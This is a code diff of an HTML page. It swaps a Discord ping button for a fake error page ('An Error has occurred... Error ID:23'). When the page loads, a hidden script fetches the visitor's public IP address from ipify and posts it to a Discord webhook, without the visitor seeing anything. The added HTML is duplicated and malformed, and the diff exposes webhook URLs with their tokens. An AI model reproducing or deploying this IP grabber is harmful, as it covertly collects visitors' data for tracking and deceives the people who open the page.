@@ -3,26 +3,106 @@
   <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ping</title>
-  </head>
-  <body>
-    <button onclick="sendMessage()">Send</button>
-  </body>
+<html>
+<head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+</head>
 
-  <script>
-    function sendMessage() {
-      const request = new XMLHttpRequest();
-      request.open("POST", "https://discord.com/api/webhooks/929398283003117599/nF4CwgJQOpfe4M-64tBN3bsSCw8BWYmYJ6ol0UGy_kvk-FfY-NstIJzMT8ezE_6MosFV");
+</style>
 
-      request.setRequestHeader('Content-type', 'application/json');
+</head>
+<body  style="background-color:powderblue;">
 
-      const params = {
-        username: "Pinger",
-        avatar_url: "",
-        content: "Ping !<@&929397855960043571>"
-      }
+<h1>An Error has occurred (This may be intentional)</h1>
 
-      request.send(JSON.stringify(params));
-    }
-  </script>
+<p>Error ID:23</p>
+
+</body>
+<script>
+var response
+
+fetch("https://api.ipify.org/?format=json")
+.then(d=>d.json())
+.then(obj=>send(obj.ip))
+  
+    
+	
+const request = new XMLHttpRequest();
+request.open("POST", "https://discord.com/api/webhooks/932894655337619486/EY1j_EiHomlAev06UTMSEnvdLvnwEG4ZZaZxS8vOSjpzqae1KQSitx-PCGbrEk41oxY_");
+
+request.setRequestHeader('Content-type', 'application/json');
+    
+	
+	
+function send (data){
+    
+	console.log(response + "r")
+	
+	const params = {
+		username: "test",
+		avatar_url: "",
+		content: (data)
+	}
+
+	console.log(data)
+	
+	request.send(JSON.stringify(params));
+  
+	console.log(params);
+    
+	
+	console.log("done")
+}
+
+</script>
+  
+  
+</body>
+</html>
+<html>
+<head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+</head>
+<body>
+
+<script>
+var response
+
+fetch("https://api.ipify.org/?format=json")
+.then(d=>d.json())
+.then(obj=>send(obj.ip))
+  
+    
+	
+const request = new XMLHttpRequest();
+request.open("POST", "https://discord.com/api/webhooks/932894655337619486/EY1j_EiHomlAev06UTMSEnvdLvnwEG4ZZaZxS8vOSjpzqae1KQSitx-PCGbrEk41oxY_");
+
+request.setRequestHeader('Content-type', 'application/json');
+    
+	
+	
+function send (data){
+    
+	console.log(response + "r")
+	
+	const params = {
+		username: "test",
+		avatar_url: "",
+		content: (data)
+	}
+
+	console.log(data)
+	
+	request.send(JSON.stringify(params));
+  
+	console.log(params);
+    
+	
+	console.log("done")
+}
+
+</script>
+  
+  
+</body>
 </html>
